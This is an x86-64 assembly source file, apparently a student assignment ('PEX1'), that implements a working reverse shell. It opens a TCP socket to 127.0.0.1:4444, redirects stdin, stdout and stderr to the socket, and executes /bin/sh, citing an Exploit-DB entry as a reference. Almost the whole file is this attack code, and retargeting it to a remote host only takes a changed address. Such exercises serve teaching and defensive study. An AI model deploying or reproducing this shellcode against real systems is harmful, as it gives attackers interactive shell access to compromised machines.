; PEX1
; Garret M. Gwozdz
; Documentation: https://gist.github.com/geyslan/5174296 , I used this as a a guideline of what I needed to do.
; Its in x86 32 so all the syscalls were different in execution but I think they were in the right orde, maybe.
; Later I used https://www.exploit-db.com/exploits/41477/, This was much more helpful because it was in 64.
; I brainstormed how to fix errors with C2C Sears Schulz

SECTION .data
sh: db "/bin/sh",0 

SECTION .text
    global _start
_start:
                                     ; create a stream socket
    mov rax, 41                      ; syscall 41 - socketcall
    mov rdi, 2                       ; family: AF_INET 2 
    mov rsi, 1                       ; type: SOCK_STREAM 1 stream socket
    mov rdx, 0                       ; protocol: IPPROTO_IP 0
    call syscall_test                ; syscall and test
   
                                     ; save file descriptor(fd) for later
    mov r8, rax                      ; saves fd in r8

                                     ; build a sockaddr_in structure
    mov dword [rsp-4], 0x0100007f    ; Address (127.0.0.1)
    mov word [rsp-6], 0x5c11         ; port in byte reverse order (2 bytes)
    mov byte [rsp-8], 0x02           ; AF_INET 2
    sub rsp, 8                       ; fix the location of the stack pointer
    mov rsi, rsp                     ; stores struct address in RSI
    
                                     ; sys_Connect
    mov rdi, r8                      ; moves fd into rdi
    mov rdx, 16                      ; length into rdx
    mov rax, 42                      ; syscall 42 - sys_connnect
    call syscall_test                ; syscall and test


    mov rsi, 0                       ; stdin file descriptor
sys_dup2:                            ; duplicating the file descriptors so they can be redirrected to the socket
    mov rax, 33                      ; syscall 33 - sysdup2
    call syscall_test                ; syscall and test
    inc rsi                          ; increment rsi to stdout then to stderr
    cmp rsi, 3                       ; test to see if all fd's have been redirected
    jne sys_dup2                     ; jumps back to sys_dup2 to continue redirecting

                                     ; execute a shell (/bin/sh)
    mov rax, 59                      ; syscall execv
    mov rdi, sh                      ; pointer to "/bin/sh"
    mov rsi, 0                       ; argv = 0
    mov rdx, 0                       ; envp = 0
    call syscall_test                ; syscall and test

syscall_test:                        ; function: executes syscall and tests whether succesful
    push rbp                         ; pushes rbp onto the stack
    mov rbp, rsp                     ; moves the rbp to rsp
    syscall                          ; executes syscall
    test rax, rax                    ; checks to see if return code is negative
    js close_socket                  ; jumps to close_socket if error
    leave                            ; resets rbp and rsp
    ret                              ; resets rip

close_socket:                        ; function:checks to see if socket exists and closes it
    push rbp                         ; pushes rbp onto the stack
    mov rbp, rsp                     ; moves the rbp to rsp
    cmp r8, 0                        ; checks to see if the socket was created
    jz end_program                   ; if it wasnt then end_program, else close socket
    mov rax, 48                      ; syscall 48 - sys_shutdown
    mov rdi, r8                      ; moves fd
    mov rsi, 2                       ; shutdown 2 send & receive
    syscall                          ; execute syscall
    jmp end_program                  ; end the program 

end_program:                         ; function: ends the program
    push rbp                         ; pushes rbp onto the stack
    mov rbp, rsp                     ; moves the rbp onto the stack
    mov rdi, rax                     ; save error_code
    mov rax, 60                      ; syscall 60 - sys_exit
    syscall                          ; execute syscall
